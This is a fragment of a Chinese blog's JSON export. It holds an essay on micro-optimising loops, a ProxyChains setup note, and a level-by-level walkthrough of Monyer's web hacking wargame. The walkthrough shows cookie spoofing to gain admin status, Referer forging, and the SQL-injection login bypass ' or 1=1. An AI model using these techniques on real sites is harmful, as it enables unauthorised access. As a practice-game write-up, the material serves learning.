title=\"卡常数\"></a>卡常数</h1><blockquote>\n<p>据考证，[卡]（Qa’a）是古埃及第一王朝的最后一位法老。</p>\n<p>他发现并研究了一种常数，后世以他的名字叫做卡常数。卡特兰数的起源也是因为卡的后人与特兰克斯结婚，生下来的孩子就叫卡特兰，而他只是发表了祖传的家书而已。</p>\n<p>Sereja也是卡的后人，提出括号序列问题，也是从家书里得到的资料。然而Sereja为了不让这个秘密公开，于是隐瞒了这道题的真正做法。可是由于卡的后人不是各个都像卡特兰一样爱慕虚荣，这一算法也无法找到。“欲见贤人而不以其道，犹欲其入而闭之门也”。卡之常数的奥秘，需要以一颗诚心去追寻。</p>\n</blockquote>\n<p>看不懂对吗？</p>\n<p>我也看不懂，因为这是一群高中生写的。按照我的理解，卡常数，就是内循环里的那些看似不重要的语句其实每一句话的运行速度是不一样的，这个客观规律，是真实存在的，举个栗子🌰</p>\n<p>程序1</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt;= K; i++)</div><div class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt;= K; j++)</div><div class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> k = <span class=\"number\">0</span>; k &lt;= K; k++) &#123; </div><div class=\"line\">      r.a[i][j] += a[i][k] * x.a[k][j];</div><div class=\"line\">      <span class=\"keyword\">if</span> (r.a[i][j] &gt;= <span class=\"number\">1l</span>l &lt;&lt; <span class=\"number\">62</span> || k == K) r.a[i][j] %= mod;</div><div class=\"line\">   &#125;</div></pre></td></tr></table></figure>\n<p>程序2</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt;= K; i++)</div><div class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt;= K; j++)</div><div class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> k = <span class=\"number\">0</span>; k &lt;= K; k++)</div><div class=\"line\">      r.a[i][j] = (r. a[i][j] + a[i][k] * x.a[k][j] % mod) % mod;</div></pre></td></tr></table></figure>\n<p>按照常人的理解，<code>程序1</code>和<code>程序2</code>的复杂度都是O(n^3)，没错，那么他们的时间是一样的吗？</p>\n<p>并不一样。</p>\n<p>在机器性能并没有那么高的情况下，在测试数据量没有那么少的情况下，第二种比第一种快了一倍。</p>\n<p><strong>为什么？</strong></p>\n<p>因为第二种代码更加精炼吗？并不完全是。</p>\n<p>在<code>程序1</code>中，<code>if (r.a[i][j] &gt;= 1ll &lt;&lt; 62 || k == K)</code>实际上是耗费时间的，if操作在执行的时候真实的操作是这样的：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span>(这里面是<span class=\"literal\">true</span>吗？)</div><div class=\"line\">  左边是<span class=\"literal\">true</span>吗？</div><div class=\"line\">  右边是<span class=\"literal\">true</span>吗？</div><div class=\"line\">  ||操作是<span class=\"literal\">true</span>吗？</div></pre></td></tr></table></figure>\n<p>这必然会消耗大量的时间，同理</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">r.a[i][j] += a[i][k] * x.a[k][j];</div><div class=\"line\">r.a[i][j] = a[i][k] * x.a[k][j] + r.a[i][j];</div></pre></td></tr></table></figure>\n<p>一样吗？实际上是不一样的，后者比前者快一点。</p>\n<p>你可能觉得，这也太较真了吧？但是高效就是高效，效率提高才是硬道理。</p>\n<blockquote>\n<p>不积跬步，无以至千里；不积小流，无以成江海。</p>\n</blockquote>\n<h1 id=\"原则\"><a href=\"#原则\" class=\"headerlink\" title=\"原则\"></a>原则</h1><ul>\n<li><p>一杆内存在心中</p>\n</li>\n<li><p>多写一个不必要的循环递归，浑身难受</p>\n</li>\n<li><p>多写一个不必要的逻辑判断，浑身难受</p>\n</li>\n<li><p>多写一个无关变量，浑身难受</p>\n</li>\n<li><p>不找到最优解，浑身难受</p>\n</li>\n<li><p>始终自发的想着如何用栈、树去解决问题</p>\n</li>\n<li><p>代码效率哪怕提升的是一倍，花一天优化代码也是值得的</p>\n</li>\n<li><p>时刻遵循RP定律写代码，RP++</p>\n</li>\n</ul>\n<p>我从我接触OI那一刻起，我觉得算法是美的，每一个人写出来的算法都体现了一种算法，永远对高效快速的低复杂度的精炼代码充满敬畏之心！❤️</p>\n"},{"title":"使用ProxyChains进行终端代理","date":"2016-09-25T23:46:04.000Z","_content":"\n# 安装\n```\nbrew install proxychains-ng\n```\n# 配置\n```\nvi /usr/local/etc/proxychains.conf\n```\n# 使用\n```\nproxychains4 ssh xx:xx@xx.com\n```","source":"_posts/使用ProxyChains进行终端代理.md","raw":"---\ntitle: 使用ProxyChains进行终端代理\ndate: 2016-09-26 00:46:04\ntags: Hack\ncategories: Hack\n---\n\n# 安装\n```\nbrew install proxychains-ng\n```\n# 配置\n```\nvi /usr/local/etc/proxychains.conf\n```\n# 使用\n```\nproxychains4 ssh xx:xx@xx.com\n```","slug":"使用ProxyChains进行终端代理","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xos00285es5xv7acyo4","content":"<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install proxychains-ng</div></pre></td></tr></table></figure>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">vi /usr/local/etc/proxychains.conf</div></pre></td></tr></table></figure>\n<h1 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">proxychains4 ssh xx:xx@xx.com</div></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install proxychains-ng</div></pre></td></tr></table></figure>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">vi /usr/local/etc/proxychains.conf</div></pre></td></tr></table></figure>\n<h1 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">proxychains4 ssh xx:xx@xx.com</div></pre></td></tr></table></figure>"},{"title":"再玩Monyer的Hack Game","date":"2016-11-23T19:15:20.000Z","_content":"\n之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。\n\n<!-- more -->\n\n# 第零关\n\nhttp://monyer.com/game/game1/\n\n> 请点击链接进入第1关： 连接在左边→ ←连接在右边\n\n可是我们看不到链接地址，直接打开审查工具。\n\n```html\n<span>连接在左边→</span>\n<a href=\"first.php\"></a>\n<span>←连接在右边</span>\n```\n好的输入地址，我么进入第一关\n\n# 第一关\n\nhttp://monyer.com/game/game1/first.php\n\n打开页面依然是什么都没有，这很正常。审查工具看代码。\n\n```html\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    function check(){\n        if(document.getElementById('txt').value==\"  \"){\n            window.location.href=\"hello.php\";\n        }else{\n            alert(\"密码错误\");\n        }\n    }\n</script>\n```\n\n好了 我们知道密码了，并且知道下一关的文件是hello.php\n\n# 第二关\n\nhttp://monyer.com/game/game1/hello.php\n\n审查工具看源代码，head中\n\n```html\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    document.oncontextmenu=function(){return false};\n\n    var a,b,c,d,e,f,g;\n    a = 3.14;\n    b = a * 2;\n    c = a + b;\n    d = c / b + a;\n    e = c - d * b + a;\n    f = e + d /c -b * a;\n    g = f * e - d + c * b + a;\n    a = g * g;\n    a = Math.floor(a);\n\n    function check(){\n        if(document.getElementById(\"txt\").value==a){\n            window.location.href=a + \".php\";\n        }else{\n            alert(\"密码错误\");\n            return false;\n        }\n    }\n</script>\n```\n\n现在是2016年了，我们不需要手算和计算器了。直接在chrome的console里输入\n```javascript\nvar a,b,c,d,e,f,g;\n    a = 3.14;\n    b = a * 2;\n    c = a + b;\n    d = c / b + a;\n    e = c - d * b + a;\n    f = e + d /c -b * a;\n    g = f * e - d + c * b + a;\n    a = g * g;\n    a = Math.floor(a);\n    \n424178\n```\n好的我们知道a的值是424178，输入，进入下一关\n\n# 第三关\n\nhttp://monyer.com/game/game1/424178.php\n\nhead中存在js\n\n```javascript\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125));\n</script>\n```\n\n新时代无须解释，直接上chrome consle\n```javascript\nString.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125)\n```\n输出为\n```javascript\nfunction check(){\n\tvar a = 'd4g';\n\tif(document.getElementById('txt').value==a){\n\t\twindow.location.href=a+\".php\";\n\t}else{\n\t\talert(\"密码错误\");\n\t}\n}\n```\n好了我们知道了，密码是d4g，下一关！\n\n# 第四关\n\nhttp://monyer.com/game/game1/d4g.php\n\n这一关非常猥琐，页面会自动跳转，稍有不注意，就跳走了。\n打开后立即按esc停止。\n\n```javascript\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('a=\"e\";d c(){b(9.8(\\'7\\').6==a){5.4.3=a+\".2\"}1{0(\"密码错误\")}}',15,15,'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'.split('|'),0,{}))\n</script>\n```\n\n显然这是一个加密的js，我们需要解密，上解密工具：\n\nhttp://tool.lu/js/\n\n解密后：\n\n```javascript\na = \"3bhe\";\n\nfunction check() {\n\tif (document.getElementById('txt').value == a) {\n\t\twindow.location.href = a + \".php\"\n\t} else {\n\t\talert(\"密码错误\")\n\t}\n}\n```\n密码是 3bhe 下一关\n\n诶？怎么不对？仔细检查源代码发现下面还有一行\n```javascript\neval(\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\");\n```\n解密！\n```javascript\na = a.toUpperCase() + 1;\n```\n.toUpperCase()是转换大写，所以密码是 3BHE1 下一关 go\n\n# 第五关\nhttp://monyer.com/game/game1/3BHE1.php\n\n> 密码在哪儿？额，我藏在页面里了哦！\n\n这题的难点在于 找到不密码藏在哪里了 搜索了个遍 就是找不到密码 看看http头呢？\n\n找到了，在cookie里\n\n```\nmonyer:the password for the next level is asdf\n```\n\n下一关！\n\n# 第六关\n\nhttp://monyer.com/game/game1/asdf.php\n\n是个线索题目\n\nGet the latest fashion, beauty, dating, and health tips. Plus, win freebies, take quizzes, and check your daily horoscope! Girl Games - 9000+ Free Games for Girls ...\n\n真蛋疼\n把这个线索在网上一搜 第一个已经是一个结题方案了，看来monyer的游戏已经成功干过一个网站了。\n\n这个答案是；seventeen\n\n# 第七关\n\nhttp://monyer.com/game/game1/seventeen7.php\n\n社工题\n\n先解密md5吧\n\n5e023995fb3f5e840ee684784f8f0799\n\nhttp://www.somd5.com/\n\n解密出  eighteen8\n\n下一关\n\n# 第八关\n\nhttp://monyer.com/game/game1/eighteen8.php\n\n直接看到 一个404 不要着急 审查工具\n\n```\n<p style=\"display:none\">\n第8关\n朋友您好，第8关欢迎您！\n我对您的聪明才智感到惊讶！\n相信我，现在世界上85%以上的人都在你之下，\n所以你可以大步向前，义无反顾地进行你的事业了。\n因为只要你肯努力，不畏惧挫折，这个世界上没有难倒你的事。\n那么继续我们的约定，我将告诉你第9关的入口：\n10000以内所有质数和.php\n</p>\n```\n10000以内所有质数和，so easy！写个javascript 算一下。\n\n```\nvar sum = 0;\nfor (var i = 2; i < 10000; i++) {\n\tvar flag = true;\n\tfor (var j = 2; j <= Math.sqrt(i); j++) {\n\t\tif (i % j == 0) flag = false ;\n\t}\n    if(flag) {sum = sum + i;}\n}\nconsole.log(sum);\n\n5736396\n```\n下一关\n\n# 第九关\n\nhttp://monyer.com/game/game1/5736396.php\n\n在命令行里输入：\n```\nwget http://monyer.com/game/game1/img/4681851790659554.jpg\ncat 4681851790659554.jpg\n```\n密码藏在图片里\n```\n���^�v��*{I�z��^�iؾSRW�V�6�Z��(����H�����ٹ�����\n�Ǿ���ʽ�ʲô���ţ�\n�ԣ�������������������......��\n��ϲ�㣡\n��ʮ������Ϊ��MonyerLikeYou_the10level\n�����ڿ�ʼ�漰������Ķ�̬���������㶼���԰���ʾ������ɵģ�\n�����Լ���û��ģ�%\n```\nMonyerLikeYou_the10level\n\n# 第十关\n\nhttp://monyer.com/game/game1/MonyerLikeYou_the10level.php\n\n> 当前用户身份为simpleuser 不是admin，无法显示下一关密码\n\n很显然这是一道session/cookie欺骗题\n\n在console里直接输入\n```\ndocument.cookie=\"username=admin\"\n```\n\n刷新\n>好聪明哦！下一关密码为：doyouknow\n\n下一关！\n\n# 第十一关\nhttp://monyer.com/game/game1/doyouknow.php?action=show_login_false\n\n>你的session不是passer，不能查看下一关密码\n\n在console里直接输入\n```\ndocument.cookie=\"username=passer\"\n```\n\n刷新，好像不对哦，monyer骗我，哼！\n\n再看标题 action=show_login_false \n\nhttp://monyer.com/game/game1/doyouknow.php?action=show_login_true\n\n> 您的session为passer，所以您可以查看下一关密码：smartboy\n\n下一关！\n\n# 第十二关\n\nhttp://monyer.com/game/game1/smartboy.php\n\n```\nJTRBJTU0JTYzJTdBJTRBJTU0JTVBJTQ3JTRBJTU0JTU5JTc5JTRBJTU0JTU5JTMxJTRBJTU0JTU5JTc4JTRBJTU0JTYzJTMxJTRBJTU0JTYzJTMwJTRBJTU0JTU5JTM1JTRBJTU0JTU5JTMyJTRBJTU0JTYzJTMxJTRBJTU0JTVBJTQ0JTRBJTU0JTRBJTQ2JTRBJTU0JTYzJTc3JTRBJTU0JTU5JTM0JTRBJTU0JTYzJTc3\n```\n直觉告诉我，这显然是Base64 解密\n```\n%4A%54%63%7A%4A%54%5A%47%4A%54%59%79%4A%54%59%31%4A%54%59%78%4A%54%63%31%4A%54%63%30%4A%54%59%35%4A%54%59%32%4A%54%63%31%4A%54%5A%44%4A%54%4A%46%4A%54%63%77%4A%54%59%34%4A%54%63%77\n```\n直觉告诉我，这显然是 UrlEncode 解密\n\nJTczJTZGJTYyJTY1JTYxJTc1JTc0JTY5JTY2JTc1JTZDJTJFJTcwJTY4JTcw\n\n直觉再次告诉我，这显然是 Base64 解密\n\n%73%6F%62%65%61%75%74%69%66%75%6C%2E%70%68%70\n\n直觉再次告诉我，这显然是  UrlEncode 解密\n\nsobeautiful.php\n\n不错 密码就是sobeautiful\n\n\n# 第十三关\nhttp://monyer.com/game/game1/sobeautiful.php\n\n> 本页禁止盗链！\n\nwtf..显然他判断了http来源，需要伪造http referer，那么我们在之前的第十二关的审查代码中加入：\n\n```html\n<a href= \"http://monyer.com/game/game1/sobeautiful.php\"> 简便伪造referer</a>\n```\n>欢迎您来到第13关\n>\n>请输入密码进入第14关：\n>\n>没有输入密码 或 密码错误 或 系统错误！\n\n看源代码有post提交\n\n这是一道SQL 注入题\n\n试试我大万能密码！ \n```\n' or 1=1 \n```\n万能密码熟记于心\n\n>下一关密码：whatyouneverknow\n\n下一关！\n\n# 第十四关\n\nhttp://monyer.com/game/game1/whatyouneverknow.php\n\n感谢@Echowxsy提供第14关解密过程\n\n![](/content/images/monyerhack/01.jpg)\n\n![](/content/images/monyerhack/02.jpg)\n\n![](/content/images/monyerhack/03.jpg)\n\n![](/content/images/monyerhack/1.jpg)\n\n![](/content/images/monyerhack/2.jpg)\n\n![](/content/images/monyerhack/3.jpg)\n\n![](/content/images/monyerhack/5.jpg)\n\n# 第十五关\n\n![](/content/images/monyerhack/4.png)\n\n\n\n\n\n\n","source":"_posts/再玩Monyer的Hack-Game.md","raw":"---\ntitle: 再玩Monyer的Hack Game\ndate: 2016-11-23 19:15:20\ntags: Hack \ncategories: Hack\n---\n\n之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。\n\n<!-- more -->\n\n# 第零关\n\nhttp://monyer.com/game/game1/\n\n> 请点击链接进入第1关： 连接在左边→ ←连接在右边\n\n可是我们看不到链接地址，直接打开审查工具。\n\n```html\n<span>连接在左边→</span>\n<a href=\"first.php\"></a>\n<span>←连接在右边</span>\n```\n好的输入地址，我么进入第一关\n\n# 第一关\n\nhttp://monyer.com/game/game1/first.php\n\n打开页面依然是什么都没有，这很正常。审查工具看代码。\n\n```html\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    function check(){\n        if(document.getElementById('txt').value==\"  \"){\n            window.location.href=\"hello.php\";\n        }else{\n            alert(\"密码错误\");\n        }\n    }\n</script>\n```\n\n好了 我们知道密码了，并且知道下一关的文件是hello.php\n\n# 第二关\n\nhttp://monyer.com/game/game1/hello.php\n\n审查工具看源代码，head中\n\n```html\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    document.oncontextmenu=function(){return false};\n\n    var a,b,c,d,e,f,g;\n    a = 3.14;\n    b = a * 2;\n    c = a + b;\n    d = c / b + a;\n    e = c - d * b + a;\n    f = e + d /c -b * a;\n    g = f * e - d + c * b + a;\n    a = g * g;\n    a = Math.floor(a);\n\n    function check(){\n        if(document.getElementById(\"txt\").value==a){\n            window.location.href=a + \".php\";\n        }else{\n            alert(\"密码错误\");\n            return false;\n        }\n    }\n</script>\n```\n\n现在是2016年了，我们不需要手算和计算器了。直接在chrome的console里输入\n```javascript\nvar a,b,c,d,e,f,g;\n    a = 3.14;\n    b = a * 2;\n    c = a + b;\n    d = c / b + a;\n    e = c - d * b + a;\n    f = e + d /c -b * a;\n    g = f * e - d + c * b + a;\n    a = g * g;\n    a = Math.floor(a);\n    \n424178\n```\n好的我们知道a的值是424178，输入，进入下一关\n\n# 第三关\n\nhttp://monyer.com/game/game1/424178.php\n\nhead中存在js\n\n```javascript\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125));\n</script>\n```\n\n新时代无须解释，直接上chrome consle\n```javascript\nString.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125)\n```\n输出为\n```javascript\nfunction check(){\n\tvar a = 'd4g';\n\tif(document.getElementById('txt').value==a){\n\t\twindow.location.href=a+\".php\";\n\t}else{\n\t\talert(\"密码错误\");\n\t}\n}\n```\n好了我们知道了，密码是d4g，下一关！\n\n# 第四关\n\nhttp://monyer.com/game/game1/d4g.php\n\n这一关非常猥琐，页面会自动跳转，稍有不注意，就跳走了。\n打开后立即按esc停止。\n\n```javascript\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('a=\"e\";d c(){b(9.8(\\'7\\').6==a){5.4.3=a+\".2\"}1{0(\"密码错误\")}}',15,15,'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'.split('|'),0,{}))\n</script>\n```\n\n显然这是一个加密的js，我们需要解密，上解密工具：\n\nhttp://tool.lu/js/\n\n解密后：\n\n```javascript\na = \"3bhe\";\n\nfunction check() {\n\tif (document.getElementById('txt').value == a) {\n\t\twindow.location.href = a + \".php\"\n\t} else {\n\t\talert(\"密码错误\")\n\t}\n}\n```\n密码是 3bhe 下一关\n\n诶？怎么不对？仔细检查源代码发现下面还有一行\n```javascript\neval(\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\");\n```\n解密！\n```javascript\na = a.toUpperCase() + 1;\n```\n.toUpperCase()是转换大写，所以密码是 3BHE1 下一关 go\n\n# 第五关\nhttp://monyer.com/game/game1/3BHE1.php\n\n> 密码在哪儿？额，我藏在页面里了哦！\n\n这题的难点在于 找到不密码藏在哪里了 搜索了个遍 就是找不到密码 看看http头呢？\n\n找到了，在cookie里\n\n```\nmonyer:the password for the next level is asdf\n```\n\n下一关！\n\n# 第六关\n\nhttp://monyer.com/game/game1/asdf.php\n\n是个线索题目\n\nGet the latest fashion, beauty, dating, and health tips. Plus, win freebies, take quizzes, and check your daily horoscope! Girl Games - 9000+ Free Games for Girls ...\n\n真蛋疼\n把这个线索在网上一搜 第一个已经是一个结题方案了，看来monyer的游戏已经成功干过一个网站了。\n\n这个答案是；seventeen\n\n# 第七关\n\nhttp://monyer.com/game/game1/seventeen7.php\n\n社工题\n\n先解密md5吧\n\n5e023995fb3f5e840ee684784f8f0799\n\nhttp://www.somd5.com/\n\n解密出  eighteen8\n\n下一关\n\n# 第八关\n\nhttp://monyer.com/game/game1/eighteen8.php\n\n直接看到 一个404 不要着急 审查工具\n\n```\n<p style=\"display:none\">\n第8关\n朋友您好，第8关欢迎您！\n我对您的聪明才智感到惊讶！\n相信我，现在世界上85%以上的人都在你之下，\n所以你可以大步向前，义无反顾地进行你的事业了。\n因为只要你肯努力，不畏惧挫折，这个世界上没有难倒你的事。\n那么继续我们的约定，我将告诉你第9关的入口：\n10000以内所有质数和.php\n</p>\n```\n10000以内所有质数和，so easy！写个javascript 算一下。\n\n```\nvar sum = 0;\nfor (var i = 2; i < 10000; i++) {\n\tvar flag = true;\n\tfor (var j = 2; j <= Math.sqrt(i); j++) {\n\t\tif (i % j == 0) flag = false ;\n\t}\n    if(flag) {sum = sum + i;}\n}\nconsole.log(sum);\n\n5736396\n```\n下一关\n\n# 第九关\n\nhttp://monyer.com/game/game1/5736396.php\n\n在命令行里输入：\n```\nwget http://monyer.com/game/game1/img/4681851790659554.jpg\ncat 4681851790659554.jpg\n```\n密码藏在图片里\n```\n���^�v��*{I�z��^�iؾSRW�V�6�Z��(����H�����ٹ�����\n�Ǿ���ʽ�ʲô���ţ�\n�ԣ�������������������......��\n��ϲ�㣡\n��ʮ������Ϊ��MonyerLikeYou_the10level\n�����ڿ�ʼ�漰������Ķ�̬���������㶼���԰���ʾ������ɵģ�\n�����Լ���û��ģ�%\n```\nMonyerLikeYou_the10level\n\n# 第十关\n\nhttp://monyer.com/game/game1/MonyerLikeYou_the10level.php\n\n> 当前用户身份为simpleuser 不是admin，无法显示下一关密码\n\n很显然这是一道session/cookie欺骗题\n\n在console里直接输入\n```\ndocument.cookie=\"username=admin\"\n```\n\n刷新\n>好聪明哦！下一关密码为：doyouknow\n\n下一关！\n\n# 第十一关\nhttp://monyer.com/game/game1/doyouknow.php?action=show_login_false\n\n>你的session不是passer，不能查看下一关密码\n\n在console里直接输入\n```\ndocument.cookie=\"username=passer\"\n```\n\n刷新，好像不对哦，monyer骗我，哼！\n\n再看标题 action=show_login_false \n\nhttp://monyer.com/game/game1/doyouknow.php?action=show_login_true\n\n> 您的session为passer，所以您可以查看下一关密码：smartboy\n\n下一关！\n\n# 第十二关\n\nhttp://monyer.com/game/game1/smartboy.php\n\n```\nJTRBJTU0JTYzJTdBJTRBJTU0JTVBJTQ3JTRBJTU0JTU5JTc5JTRBJTU0JTU5JTMxJTRBJTU0JTU5JTc4JTRBJTU0JTYzJTMxJTRBJTU0JTYzJTMwJTRBJTU0JTU5JTM1JTRBJTU0JTU5JTMyJTRBJTU0JTYzJTMxJTRBJTU0JTVBJTQ0JTRBJTU0JTRBJTQ2JTRBJTU0JTYzJTc3JTRBJTU0JTU5JTM0JTRBJTU0JTYzJTc3\n```\n直觉告诉我，这显然是Base64 解密\n```\n%4A%54%63%7A%4A%54%5A%47%4A%54%59%79%4A%54%59%31%4A%54%59%78%4A%54%63%31%4A%54%63%30%4A%54%59%35%4A%54%59%32%4A%54%63%31%4A%54%5A%44%4A%54%4A%46%4A%54%63%77%4A%54%59%34%4A%54%63%77\n```\n直觉告诉我，这显然是 UrlEncode 解密\n\nJTczJTZGJTYyJTY1JTYxJTc1JTc0JTY5JTY2JTc1JTZDJTJFJTcwJTY4JTcw\n\n直觉再次告诉我，这显然是 Base64 解密\n\n%73%6F%62%65%61%75%74%69%66%75%6C%2E%70%68%70\n\n直觉再次告诉我，这显然是  UrlEncode 解密\n\nsobeautiful.php\n\n不错 密码就是sobeautiful\n\n\n# 第十三关\nhttp://monyer.com/game/game1/sobeautiful.php\n\n> 本页禁止盗链！\n\nwtf..显然他判断了http来源，需要伪造http referer，那么我们在之前的第十二关的审查代码中加入：\n\n```html\n<a href= \"http://monyer.com/game/game1/sobeautiful.php\"> 简便伪造referer</a>\n```\n>欢迎您来到第13关\n>\n>请输入密码进入第14关：\n>\n>没有输入密码 或 密码错误 或 系统错误！\n\n看源代码有post提交\n\n这是一道SQL 注入题\n\n试试我大万能密码！ \n```\n' or 1=1 \n```\n万能密码熟记于心\n\n>下一关密码：whatyouneverknow\n\n下一关！\n\n# 第十四关\n\nhttp://monyer.com/game/game1/whatyouneverknow.php\n\n感谢@Echowxsy提供第14关解密过程\n\n![](/content/images/monyerhack/01.jpg)\n\n![](/content/images/monyerhack/02.jpg)\n\n![](/content/images/monyerhack/03.jpg)\n\n![](/content/images/monyerhack/1.jpg)\n\n![](/content/images/monyerhack/2.jpg)\n\n![](/content/images/monyerhack/3.jpg)\n\n![](/content/images/monyerhack/5.jpg)\n\n# 